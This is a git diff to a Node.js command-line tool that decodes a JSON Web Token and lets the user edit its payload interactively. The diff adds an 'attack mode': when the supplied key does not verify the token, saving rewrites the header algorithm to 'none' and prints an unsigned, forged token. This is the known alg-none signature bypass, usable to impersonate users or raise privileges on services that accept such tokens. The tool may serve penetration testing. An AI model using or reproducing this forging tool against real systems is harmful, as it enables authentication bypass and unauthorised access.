@@ -1,5 +1,8 @@
 const jwt = require("jsonwebtoken");
 const readline = require("readline");
+const jwtRead = require('./scripts/utils/jwtReader.js')
+
+const jwtSign = require('./scripts/utils/jwtSigner.js')
 
 async function getInput(prompt) {
   const rl = readline.createInterface(process.stdin, process.stdout);
@@ -9,21 +12,22 @@ async function getInput(prompt) {
   }))
 }
 
-// Get the token from the command line
-const token = process.argv[2];
-if (!token) {
-  console.error("Please provide a valid JWT token as an argument.");
-  process.exit(1);
-}
-
-// Decode the token and get the payload
-const payload = jwt.decode(token);
-if (!payload) {
-  console.error("Invalid JWT token.");
-  process.exit(1);
-}
 
 (async () => {
+  const token = await getInput('Enter JWT token here: ');
+  let decoded = jwtRead(token)
+  const payload = decoded.payload;
+  const isRSA = decoded.headers.alg.slice(0,2)==='RS';
+  const potentialKnownKey = await getInput('If you know the JWT signing key, enter it now. If not,' +
+    'type anything to continue: ');
+  let keyKnown = false;
+  try {
+    jwt.verify(token,potentialKnownKey)
+    keyKnown = true
+    console.log('This key has been verified, and used to sign the token.')
+  } catch {
+    console.log('This key was not used to sign this token. Using attack mode instead.')
+  }
   let path = [];
   while (true) {
     let obj = payload;
@@ -38,8 +42,10 @@ Enter 'set' to change a key's value,
       'back' to navigate out of a nested object:
 `);
     if (answer === "save") {
-      const newToken = jwt.sign(payload, "secret");
-      console.log(`\nNew JWT token: ${newToken}\n`);
+      decoded.headers.alg = 'none'
+      const newToken = jwtSign(decoded.headers,payload, null,null,'none');
+      console.log('None-signed token: ');
+      console.log(newToken)
       return;
     } else if (answer === "cd") {
       const key = await getInput("Enter the key of the nested object: ");
